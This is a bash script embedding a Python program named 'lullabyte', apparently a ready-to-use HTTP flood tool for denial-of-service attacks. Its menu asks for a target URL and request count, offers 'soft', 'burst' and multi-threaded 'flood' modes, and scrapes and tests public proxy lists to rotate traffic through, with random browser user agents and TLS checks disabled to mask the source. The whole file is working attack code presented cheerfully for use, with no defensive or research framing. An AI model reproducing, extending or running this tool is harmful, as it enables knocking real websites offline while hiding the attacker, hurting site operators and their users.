#!/bin/bash
# lullabyte-terminal.sh - terminal version of lullabyte
# by pluto

set -e

echo ""
echo "  checking dependencies..."

if ! command -v python3 &> /dev/null; then
    echo "  python3 is needed but not found. please install it first."
    exit 1
fi

_missing=0
python3 -c "import colorama" 2>/dev/null || { echo "  colorama not found. run install_lullabyte.sh first."; _missing=1; }
python3 -c "import requests" 2>/dev/null || { echo "  requests not found. run install_lullabyte.sh first."; _missing=1; }
if [ "$_missing" -eq 1 ]; then
    exit 1
fi

echo "  dependencies ready!"
echo ""

python3 << '__LULLABYTE终端__'
import sys
import os
import time
import random
import threading

import colorama
from colorama import Fore, Style
colorama.init()

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PINK = "\033[38;5;206m"
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT
DIM = Style.DIM
LINE = DIM + "\u2500" * 40 + RESET

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]


def _read():
    """read a line from the terminal, not from stdin (heredoc eats stdin)."""
    try:
        return open("/dev/tty").readline().strip()
    except OSError:
        return input().strip()


def scrape_proxies():
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
        "https://raw.githubusercontent.com/ErcinDedeworken/proxies/main/http_proxies.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/Zaebedee/proxy-list/main/http.txt",
    ]
    proxies = []
    for url in proxy_sources:
        try:
            resp = requests.get(url, timeout=8)
            if resp.status_code == 200:
                for line in resp.text.strip().split("\n"):
                    line = line.strip()
                    if line and ":" in line:
                        proxies.append(line)
        except requests.exceptions.RequestException:
            pass
    return list(set(proxies))


def filter_proxies(proxies, max_workers=32, timeout=6, check_url="https://example.com"):
    """test each proxy against a benign endpoint and keep only working ones."""
    if not proxies:
        return []

    retry = Retry(total=0)
    adapter = HTTPAdapter(pool_connections=max_workers, pool_maxsize=max_workers, max_retries=retry)
    session = requests.Session()
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    session.trust_env = False

    valid = []
    lock = threading.Lock()

    def test(proxy):
        proxies_map = {"http": proxy, "https": proxy}
        try:
            resp = session.get(check_url, proxies=proxies_map, timeout=timeout, verify=False)
            if resp.status_code == 200:
                with lock:
                    valid.append(proxy)
        except requests.exceptions.RequestException:
            pass

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(test, proxies))

    session.close()
    return valid


def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    if os.path.isfile("/usr/bin/figlet"):
        art = os.popen("figlet lullabyte").read()
    else:
        art = "lullabyte"
    for line in art.split("\n"):
        if line.rstrip():
            print(PINK + line + RESET)
    print()
    print(DIM + "  by pluto" + RESET)
    print()


def ask_input(question, default=None):
    suffix = f" {DIM}({default}){RESET}" if default else ""
    print(PINK + "?" + RESET + " " + question + suffix)
    try:
        val = _read()
    except (EOFError, KeyboardInterrupt, FileNotFoundError):
        print("\n" + DIM + "  see you next time!" + RESET + "\n")
        sys.exit(0)
    return val if val else default


def ask_choice(options):
    print(PINK + "?" + RESET + " pick one:")
    for i, opt in enumerate(options, 1):
        print(f"   {BOLD}{i}{RESET}. {opt}")
    while True:
        try:
            c = _read()
        except (EOFError, KeyboardInterrupt, FileNotFoundError):
            print("\n" + DIM + "  see you next time!" + RESET + "\n")
            sys.exit(0)
        if c.isdigit() and 1 <= int(c) <= len(options):
            return int(c) - 1
        print(DIM + "   type a number from the list" + RESET)


def show_progress(sent, total):
    pct = sent / total if total > 0 else 0
    filled = int(30 * pct)
    bar = PINK + "\u2588" * filled + "\033[38;5;252m" + "\u2591" * (30 - filled) + RESET
    sys.stdout.write(f"\r   {bar} {BOLD}{int(pct * 100)}%{RESET} {DIM}{sent}/{total}{RESET}  ")
    sys.stdout.flush()


class Attack:
    def __init__(self, url, num_requests, mode, use_proxy):
        self.url = url
        self.num_requests = num_requests
        self.mode = mode
        self.use_proxy = use_proxy
        self.proxies = []
        self.running = True
        self.sent = 0
        self.errors = 0
        self.lock = threading.Lock()

    def run(self):
        print()
        print(PINK + "  ~ lullabyte activated ~" + RESET)
        print()

        if self.use_proxy:
            print("   " + DIM + "fetching proxies..." + RESET, end="", flush=True)
            proxies = scrape_proxies()
            proxies = [p for p in proxies if p]
            valid = filter_proxies(proxies)
            self.proxies = [{"http": p, "https": p} for p in valid]
            if self.proxies:
                print(f"\r   {PINK}scraped {len(proxies)}, {len(self.proxies)} working proxies :3{RESET}" + " " * 30)
            else:
                print(f"\r   {DIM}no working proxies found, going direct{RESET}" + " " * 30)
            print()

        start = time.time()

        if self.mode == "soft":
            workers = 1
            batch_target = 1
        elif self.mode == "burst":
            workers = 16
            batch_target = 32
        else:
            workers = 32
            batch_target = 64

        retry = Retry(total=1, connect=1, read=1, redirect=1, backoff_factor=0.1, status_forcelist=[])
        adapter = HTTPAdapter(
            pool_connections=workers,
            pool_maxsize=workers,
            max_retries=retry,
            pool_block=True,
        )
        session = requests.Session()
        session.mount("https://", adapter)
        session.mount("http://", adapter)
        executor = ThreadPoolExecutor(max_workers=workers)

        def send(headers, proxy):
            session.get(self.url, headers=headers, proxies=proxy, timeout=5, verify=False)

        try:
            futures = []
            total = self.num_requests * (1 if self.mode == "burst" else 5)
            for _ in range(total):
                if not self.running:
                    break
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                proxy = random.choice(self.proxies) if (self.use_proxy and self.proxies) else None

                if self.mode == "soft":
                    try:
                        send(headers, proxy)
                        with self.lock:
                            self.sent += 1
                            show_progress(self.sent, self.num_requests)
                    except requests.exceptions.RequestException:
                        with self.lock:
                            self.errors += 1
                    except Exception:
                        with self.lock:
                            self.errors += 1
                    continue

                futures.append(executor.submit(send, headers, proxy))
                if len(futures) >= batch_target:
                    for fut in as_completed(futures):
                        try:
                            fut.result()
                        except requests.exceptions.RequestException:
                            with self.lock:
                                self.errors += 1
                        except Exception:
                            with self.lock:
                                self.errors += 1
                        finally:
                            with self.lock:
                                self.sent += 1
                                show_progress(self.sent, self.num_requests)
                    futures = []

            for fut in as_completed(futures):
                try:
                    fut.result()
                except requests.exceptions.RequestException:
                    with self.lock:
                        self.errors += 1
                except Exception:
                    with self.lock:
                        self.errors += 1
                finally:
                    with self.lock:
                        self.sent += 1
                        show_progress(self.sent, self.num_requests)
        finally:
            executor.shutdown(wait=False)
            session.close()

        elapsed = time.time() - start
        print("\n")

        if self.running:
            print(PINK + "  ~ done! ~" + RESET)
            print(f"   sent {BOLD}{self.sent}{RESET} requests in {BOLD}{self.mode}{RESET} mode")
            print(f"   took {BOLD}{elapsed:.1f}{RESET} seconds")
            if self.errors > 0:
                print(DIM + f"   ({self.errors} errors)" + RESET)
        else:
            print(PINK + "  ~ stopped by user ~" + RESET)
            print(f"   sent {BOLD}{self.sent}{RESET}/{self.num_requests} before stopping")
        print()

    def stop(self):
        self.running = False


def main():
    print_banner()

    print(LINE)
    action = ask_choice(["launch an attack", "exit"])
    if action == 1:
        print(DIM + "  see you next time!" + RESET + "\n")
        return

    print()
    print(LINE)
    url = ask_input("target url")
    while not url or not (url.startswith("http://") or url.startswith("https://")):
        print(DIM + "   please enter a valid url (http:// or https://)" + RESET)
        url = ask_input("target url")

    print()
    print(LINE)
    req_str = ask_input("how many requests?", "1000")
    while not req_str or not req_str.isdigit() or int(req_str) <= 0:
        print(DIM + "   please enter a positive number" + RESET)
        req_str = ask_input("how many requests?", "1000")
    num_requests = int(req_str)

    print()
    print(LINE)
    mode = ["soft", "burst", "flood"][ask_choice([
        "soft - one request at a time, slow and steady",
        "burst - threaded, faster and louder",
        "flood - maximum power, multiplies everything",
    ])]

    print()
    print(LINE)
    use_proxy = ask_choice(["yes, rotate proxies automatically", "no, go direct"]) == 0

    print()
    print(LINE)
    print()
    print(PINK + "  ~ ready to go ~" + RESET)
    print()
    print(f"   target:   {BOLD}{url}{RESET}")
    print(f"   requests: {BOLD}{num_requests}{RESET}")
    print(f"   mode:     {BOLD}{mode}{RESET}")
    print(f"   proxy:    {BOLD}{'on' if use_proxy else 'off'}{RESET}")
    print()

    ask_input("press enter to launch (ctrl+c to cancel)")

    attack = Attack(url, num_requests, mode, use_proxy)
    t = threading.Thread(target=attack.run, daemon=True)
    t.start()

    try:
        while t.is_alive():
            t.join(timeout=0.5)
    except KeyboardInterrupt:
        print()
        attack.stop()
        t.join(timeout=3)
        print(PINK + "  ~ stopped ~" + RESET + "\n")

    print(DIM + "  thanks for using lullabyte!" + RESET + "\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n" + DIM + "  see you next time!" + RESET + "\n")
        sys.exit(0)
__LULLABYTE终端__
